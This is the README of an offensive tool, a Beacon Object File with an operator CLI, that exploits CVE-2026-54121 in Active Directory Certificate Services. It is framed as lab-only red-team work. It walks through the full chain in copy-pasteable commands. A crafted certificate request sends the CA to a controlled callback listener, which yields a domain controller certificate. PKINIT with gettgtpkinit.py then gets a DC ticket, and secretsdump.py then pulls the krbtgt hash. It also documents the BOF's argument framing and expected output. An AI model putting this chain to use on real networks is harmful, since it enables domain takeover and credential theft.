# Certighost BOF

Certighost is a Windows x64 Beacon Object File plus an offline operator CLI for the enrollment-only portion of the Certighost / CVE-2026-54121 lab chain. The BOF submits a caller-supplied in-memory PKCS#10 request through `ICertRequest::Submit` with `CR_IN_BINARY | CR_IN_PKCS10 | CR_IN_RPC`, then returns the disposition, request ID, and issued certificate bytes as base64 text over Beacon output.

This is REDANTONETTA lab-only work. No push, publication, deployment, live target execution, Mythic API tasking, listener automation, or broad DRS dumping is authorized from this repository.

## Human Operator Quick Start

Use this only in an approved disposable Certighost lab with an already authorized Apollo callback and controlled callback listeners. The operator CLI never contacts Mythic or a target; it generates local secret material, emits one paste-ready Apollo command, validates exported output, and cleans only its own marked local run directory.

```sh
make bof

python3 -m tools.certighost_operator prepare \
  --run-dir '<NEW_EPHEMERAL_RUN_DIRECTORY>' \
  --callback-id '<MYTHIC_CALLBACK_ID>' \
  --agent-version '<EXACT_APOLLO_PAYLOAD_TYPE_VERSION>' \
  --coff-object build/certighost.x64.o \
  --ca-config '<CA_HOST>\<CA_NAME>' \
  --template '<ENROLLABLE_MACHINE_TEMPLATE>' \
  --target-dc '<TARGET_DC_FQDN>' \
  --cdc '<CONTROLLED_LISTENER_FQDN_OR_IP>'
```

`prepare` creates the named run directory with mode `0700`, creates a fresh RSA private key with mode `0600`, writes a PKCS#10 CSR plus `task-descriptor.json`, and prints exactly one `execute_coff` command. Paste only that command into the authorized Apollo callback.

After exporting the complete Mythic output to a local file:

```sh
python3 -m tools.certighost_operator extract \
  --run-dir '<NEW_EPHEMERAL_RUN_DIRECTORY>' \
  --mythic-output '<EXPORTED_MYTHIC_OUTPUT_FILE>' \
  --pfx-password '<TRANSIENT_PFX_PASSWORD>'
```

`extract` stores the captured output inside the marked run directory, rejects malformed or non-issued results, writes the issued certificate locally, and succeeds only when OpenSSL proves the certificate public key matches the run private key. The PFX is optional and remains a transient local secret.

```sh
python3 -m tools.certighost_operator cleanup \
  --run-dir '<NEW_EPHEMERAL_RUN_DIRECTORY>'
```

`cleanup` removes only known generated artifacts from that exact marked directory and reports unrelated files without deleting them.

## Scope

The BOF implements only the AD CS enrollment chase trigger. It does not create machine accounts, host rogue SMB/LSA or LDAP callback services, perform PKINIT, recover hashes, spawn a process, write any target-side file, submit Mythic tasks, or automate DRSUAPI. The operator CLI adds only local CSR/key generation, local output extraction, local certificate continuity verification, optional local PFX creation, and confined local cleanup.

The rogue SMB/LDAP callback services described in [the research notes](docs/research/CVE-2026-54121.md) are external in-memory lab prerequisites. PKINIT and any post-certificate action are also external prerequisites and remain outside this repository.

## Authorized Lab Walkthrough

This walkthrough is copy-pasteable once placeholders are replaced with values from the approved disposable lab. Do not put credentials, runtime IDs, raw hashes, or secret file contents into documentation, chat, or evidence bundles.

### 1. Prerequisites And Controlled Listeners

Before preparing a task, verify all of the following:

- The selected callback is Windows x64 and already has enrollment rights for the chosen template.
- Apollo `execute_coff` is version `3` and the exact Apollo payload-type version is recorded for the descriptor.
- The vulnerable Enterprise CA and enrollable template are inside the approved disposable lab only.
- The controlled callback host is listening only on the approved lab paths required for the chase flow, typically TCP `445` and TCP `389`.
- The target DC FQDN is the single intended certificate subject, SAN value, and remote-domain lookup value for this run.
- The chosen run directory is new, operator-local, and disposable.

Required listener evidence is constrained to listener state and callback metadata:

```text
<CONTROLLED_LISTENER_FQDN_OR_IP>:445 listening
<CONTROLLED_LISTENER_FQDN_OR_IP>:389 listening
```

Do not retain authentication material obtained by external listeners.

### 2. Build And Register The Reviewed BOF

```sh
make bof
shasum -a 256 build/certighost.x64.o
```

Compare the digest with the reviewed artifact record for the current commit. In the authorized Mythic operation, cache `build/certighost.x64.o` with Apollo's existing `register_file` or `register_coff` workflow and keep the cached object name `certighost.x64.o`. Do not use a target-side upload, shell copy, download, or certificate save path.

### 3. Prepare One Operator Command

```sh
python3 -m tools.certighost_operator prepare \
  --run-dir '<NEW_EPHEMERAL_RUN_DIRECTORY>' \
  --callback-id '<MYTHIC_CALLBACK_ID>' \
  --agent-version '<EXACT_APOLLO_PAYLOAD_TYPE_VERSION>' \
  --coff-object build/certighost.x64.o \
  --ca-config '<CA_HOST>\<CA_NAME>' \
  --template '<ENROLLABLE_MACHINE_TEMPLATE>' \
  --target-dc '<TARGET_DC_FQDN>' \
  --cdc '<CONTROLLED_LISTENER_FQDN_OR_IP>'
```

The CLI may prompt for omitted required values, but it never invents a run directory. Always provide or enter a fresh explicit run directory. Supplying `--agent-version` is recommended for retained evidence; if omitted, the descriptor records `operator-unspecified` rather than guessing a live version.

The first output line is the only line to paste into Mythic. The remaining lines label local secrets and the next constrained step. Review `task-descriptor.json` before execution.

### 4. Paste One Command Into Mythic

Paste the single generated line into the already authorized Apollo callback. It invokes only:

```text
execute_coff -Coff certighost.x64.o -Function go -Timeout <SECONDS> -Arguments <SIX_TYPED_ARGUMENTS>
```

Preserve the Mythic task ID and output IDs as evidence, but do not place them in persistent documentation. Save the complete exported output to a local text file after the task finishes.

### 5. Extract And Verify The Issued Certificate

```sh
python3 -m tools.certighost_operator extract \
  --run-dir '<NEW_EPHEMERAL_RUN_DIRECTORY>' \
  --mythic-output '<EXPORTED_MYTHIC_OUTPUT_FILE>' \
  --pfx-password '<TRANSIENT_PFX_PASSWORD>'
```

The command copies the exported output into the marked run directory, parses only the documented Certighost framing, writes `issued-cert.der` and `issued-cert.pem`, compares OpenSSL SHA-256 SPKI digests for the certificate and private key, and optionally creates `issued-cert.pfx`. It fails closed on malformed output, non-issued disposition, invalid DER, missing key continuity, unmarked directories, or symlinks.

### 6. External PKINIT Example

PKINIT stays external to this repository. After a successful `extract`, an approved external harness can consume the transient PFX. One narrowly scoped example using PKINITtools is:

```sh
export KRB5CCNAME='<NEW_EPHEMERAL_RUN_DIRECTORY>/target-dc.ccache'
python3 '<APPROVED_PKINITTOOLS_DIRECTORY>/gettgtpkinit.py' \
  -cert-pfx '<NEW_EPHEMERAL_RUN_DIRECTORY>/issued-cert.pfx' \
  -pfx-pass '<TRANSIENT_PFX_PASSWORD>' \
  '<AD_REALM>/<TARGET_DC_NETBIOS>$' \
  "$KRB5CCNAME"
```

Retain only sanitized success metadata such as the principal and whether a TGT was obtained. Keep the ccache ephemeral and out of reports and commits.

### 7. Prove Krbtgt-Only DRSUAPI Authority

Use the TGT only for the separately authorized one-account impact proof:

```sh
KRB5CCNAME='<NEW_EPHEMERAL_RUN_DIRECTORY>/target-dc.ccache' \
  secretsdump.py -k -no-pass -just-dc-user 'krbtgt' \
  '<AD_REALM>/<TARGET_DC_NETBIOS>$@<TARGET_DC_FQDN>'
```

Do not remove `-just-dc-user 'krbtgt'`. Do not request additional accounts. Do not perform a broad dump. Record only sanitized proof that exactly one account was requested, the result count was `1`, the RID was `502`, an NT hash was present, and `broad_dump_performed` was `false`.

### 8. Local Cleanup And Lab Rollback

Stop external listeners, destroy any external ccache or replication output, then remove only this CLI's generated local artifacts:

```sh
python3 -m tools.certighost_operator cleanup \
  --run-dir '<NEW_EPHEMERAL_RUN_DIRECTORY>'
```

The cleanup command refuses `/`, the operator home directory, the repository root, symlink directories, symlink files, and directories without the exact Certighost marker. It leaves unrelated files in place and reports them.

Revert the disposable lab systems through the approved rollback workflow:

```sh
ludus snapshots revert '<DC_PRE_PKINIT_SNAPSHOT>' --vmids '<DC_VMID>'
ludus snapshots revert '<CA_PRE_VALIDATION_SNAPSHOT>' --vmids '<CA_VMID>'
```

Verify that temporary trust, KDC, certificate, callback, listener, and request state is gone before closing the run. A later validation must use a fresh callback, CSR, key, and run directory.

## BOF Argument Contract

The `go` entrypoint expects the standard Beacon `bof_pack` frame: one little-endian `u32` payload length followed by six little-endian length-prefixed binary fields. Apollo `execute_coff` v3 passes that frame intact:

```sleep
$args = bof_pack($bid, "bbbbbb",
    $csr_der,
    $ca_config,
    $template,
    $san_dns,
    $cdc,
    $rmd);
```

Fields are ordered as follows:

| Position | Field | Meaning | Validation |
| --- | --- | --- | --- |
| 1 | `csr_der` | DER PKCS#10 request bytes | Non-empty, at most 256 KiB, bounded outer DER `SEQUENCE` |
| 2 | `ca_config` | CA configuration string such as `<CA_HOST>\<CA_NAME>` | ASCII `host\CAName`, at most 512 bytes |
| 3 | `template` | Certificate template value | Printable ASCII without `:` or newlines, at most 128 bytes |
| 4 | `san_dns` | DNS SAN value without the `dns=` prefix | Optional empty field, otherwise DNS/IP-like ASCII, at most 255 bytes |
| 5 | `cdc` | Chase callback host/IP value | Required DNS/IP-like ASCII, at most 255 bytes |
| 6 | `rmd` | Remote-domain/principal lookup DNS value | Required DNS/IP-like ASCII, at most 255 bytes |

`prepare` maps `--target-dc` to both `san_dns` and `rmd`, generates the fresh CSR locally, and passes the raw six fields into `build_task_descriptor` and `validate_task_descriptor`. Operators do not hand-base64 encode any field. The descriptor primitive owns the typed `base64:` conversion and validates the exact six-field order plus the intact Apollo frame; pre-encoding a field would change the bytes seen by the BOF and break the validated contract.

The BOF constructs this exact attribute string in memory:

```text
CertificateTemplate:<template>
SAN:dns=<san_dns>
cdc:<cdc>
rmd:<rmd>
```

The `SAN:dns=` line is omitted only when `san_dns` is empty.

## Output And Expected Results

On issuance, the BOF emits a text header and a base64-framed DER certificate:

```text
CERTIGHOST_RESULT disposition=3 request_id=<id> cert_encoding=base64 cert_der_bytes=<n> cert_base64_chars=<n>CERTIGHOST_CERT_BEGIN
<base64 DER certificate>
CERTIGHOST_CERT_END
```

Apollo aggregates the issued `BeaconPrintf` header directly with the next `BeaconOutput` marker, so the canonical exported text has no newline between `cert_base64_chars=<n>` and `CERTIGHOST_CERT_BEGIN`. No output field is a filesystem path. For a denied, pending, or failed submission, the BOF emits the disposition, request ID when available, last status HRESULT when available, and a sanitized CA disposition message. Input validation failures occur before COM enrollment is attempted.

Expected vulnerable result:

- `CERTIGHOST_RESULT disposition=3` is present.
- A single certificate block is present and `extract` verifies certificate/private-key continuity.
- The controlled listener evidence shows the expected lab callback path.
- The later PKINIT and krbtgt-only proof use only the transient local secrets created for that run.

Expected patched negative control:

- The BOF emits `certighost: request not issued (...)` rather than a certificate block.
- `extract` exits non-zero and does not write certificate or PFX artifacts.
- The controlled listener evidence shows no chase callback.
- No PKINIT or DRS proof is attempted.

## Troubleshooting

- `openssl was not found in PATH`: install or select a local OpenSSL-compatible binary before running `prepare` or `extract`.
- `run directory already exists`: choose a new explicit directory; a run never reuses an old secret workspace.
- `ca_config must be ASCII host\CAName`: pass exactly one backslash between the CA host and CA name, with no slash, colon, or newline.
- `certificate was not issued`: retain the request ID and CA status as evidence, correct only the authorized lab prerequisite, and start a fresh run.
- `issued certificate public key does not match the run private key`: stop immediately; do not use the certificate or PFX for PKINIT.
- `directory is not the exact marked Certighost run directory`: use the original run directory created by `prepare`; do not rename, symlink, or substitute directories.
- `symlink path is not allowed`: replace the symlink with a direct regular file or directory inside the operator-local run workspace.

## Build And Test

```sh
make test
make bof
make lint
make imports
git diff --check
```

`make bof` prefers `x86_64-w64-mingw32-gcc` when present. In this worktree it falls back to the installed LLVM clang cross-target path and emits `build/certighost.x64.o` as `coff-x86-64`. `make test` builds and runs the macOS host harness plus the offline Mythic packing, task-schema, output, filesystem-evidence, repeatability, cleanup, and operator workflow tests.

## Recovery

If the CA returns a non-issued disposition, retain the reported request ID and CA message as evidence and correct the lab prerequisite or request input before rerunning. The BOF does not retrieve pending requests later, persist certificates on the victim, or attempt any recovery action that changes target state.

## Research

- [CVE-2026-54121 / Certighost primary-source research](docs/research/CVE-2026-54121.md)

## Mythic Integration

- [Offline Apollo execute_coff v3 workflow and evidence validation](docs/mythic-integration.md)
- [Sanitized manual full-chain validation](docs/manual-full-chain-validation.md)

## Lab Design

- [REDANTONETTA declarative lab runbook](docs/lab/CVE-2026-54121-redantonetta-runbook.md)
- [Ludus range config](ludus/ranges/redantonetta-certighost.yml)
- [Local Certighost lab role](ludus/roles/certighost_lab)
